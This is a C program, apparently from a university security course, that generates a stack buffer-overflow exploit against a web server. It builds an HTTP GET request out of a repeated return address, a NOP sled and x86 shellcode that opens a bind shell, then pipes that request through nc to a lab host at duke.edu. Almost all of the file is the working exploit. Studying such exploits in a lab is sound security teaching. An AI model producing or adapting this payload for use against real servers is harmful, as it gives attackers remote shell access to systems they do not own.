#include <signal.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/stat.h>

int main(int argc, char *argv[]) {
    char* attack_string = (char *)malloc(4096*sizeof (char));
    char* return_address = (char *)malloc(16*sizeof (char));
    char* nops = (char *)malloc(4*sizeof (char));
    return_address = "\x5cx84\x5cxfe\x5cxff\x5cxbf";
    
    int i;
    int j;
    strcat(attack_string,"echo -e \x22GET /");
    
    for (i = 0; i < atoi(argv[1]); i++) {
        strcat(attack_string, return_address);
    }
    
    for (j = 0; j < atoi(argv[2]); j++) {
        strcat(attack_string, "\x5cx90");
    }
    
    strcat(attack_string, "\x5cx31\x5cxdb\x5cxf7\x5cxe3\x5cxb0\x5cx66\x5cx43\x5cx52\x5cx53\x5cx6a\x5cx02\x5cx89\x5cxe1\x5cxcd\x5cx80\x5cx5b\x5cx5e\x5cx52\x5cx66\x5cx68\x5cx22\x5cxb8\x5cx6a\x5cx10\x5cx51\x5cx50\x5cxb0\x5cx66\x5cx89\x5cxe1\x5cxcd\x5cx80\x5cx89\x5cx51\x5cx04\x5cxb0\x5cx66\x5cxb3\x5cx04\x5cxcd\x5cx80\x5cxb0\x5cx66\x5cx43\x5cxcd\x5cx80\x5cx59\x5cx93\x5cx6a\x5cx3f\x5cx58\x5cxcd\x5cx80\x5cx49\x5cx79\x5cxf8\x5cxb0\x5cx0b\x5cx68\x5cx2f\x5cx2f\x5cx73\x5cx68\x5cx68\x5cx2f\x5cx62\x5cx69\x5cx6e\x5cx89\x5cxe3\x5cx41\x5cxcd\x5cx80");
    strcat(attack_string," HTTP\x22 | nc 310test.cs.duke.edu 9139");
    
    printf("%s\n", attack_string);
}